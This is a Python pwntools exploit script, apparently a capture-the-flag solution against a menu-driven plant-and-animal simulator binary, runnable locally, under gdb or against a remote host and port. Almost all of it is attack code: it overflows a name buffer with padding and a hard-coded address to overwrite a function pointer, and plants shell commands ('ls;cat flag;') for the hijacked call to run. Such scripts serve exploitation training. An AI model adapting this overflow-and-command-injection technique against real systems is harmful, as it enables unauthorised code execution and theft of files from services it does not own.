from pwn import *
import sys
from os import path
import argparse
from time import sleep

# this is a horrible hack of a script, but it works

def do_stuff(r):
	system_addr = p32(0x400a5d)
	

	# Create a plant
	r.recvuntil("4.")
	r.recvline()
	r.sendline("2")

	# Name it with the command
	r.recvline()
	r.sendline("ls;cat flag;")

	# Overwrite what will be the special function
	r.recvline()
	r.sendline("A" * 52 + "\xc0\x07\x40")

	# Remove the plant
	r.recvuntil("4.")
	r.recvline()
	r.sendline("4")
	r.recvline()
	r.sendline("0")

	# Create an animal
	r.recvuntil("4.")
	r.recvline()
	r.sendline("1")

	# Type it with the command
	r.recvline()
	r.sendline("ls;cat flag;")

	# Name it with anything
	r.recvline()
	r.sendline("John")

	# Remove the animal
	r.recvuntil("4.")
	r.recvline()
	r.sendline("4")
	r.recvline()
	r.sendline("1")

	# Create a plant
	r.recvuntil("4.")
	r.recvline()
	r.sendline("2")

	# Name it with the command
	r.recvline()
	r.sendline("ls;cat flag;")

	# Overwrite what will be the special function
	r.recvline()
	r.sendline("A" * 12 + "ls;cat flag;cat flag.txt;" + "B" * 15 + "\xc0\x07\x40\x00\x00\x00\x00\x00")

	# Run the simulation
	r.recvuntil("4.")
	r.recvline()

	r.interactive()
	r.sendline("3")
	
if __name__ == "__main__":
	if len(sys.argv) == 2 or (len(sys.argv) == 3 and sys.argv[2] == "--gdb"):
		# Parse
		if len(sys.argv) == 3 and sys.argv[2] == "--gdb":
			r = process(sys.argv[1])
			gdb.attach(r, "b *0x400e88")    # commands can be specified as the second parameter
			do_stuff(r)
			r.close()
		else:
			r = process(sys.argv[1])
			do_stuff(r)
			r.close()
			log.error("No such file")
	elif len(sys.argv) == 3:
		# Parse
		host = sys.argv[1]
		try:
			port = int(sys.argv[2])
		except:
			log.error("Port must be a number")
		# Setup connection and call helper
		r = remote(host, port)
		do_stuff(r)
		r.close()
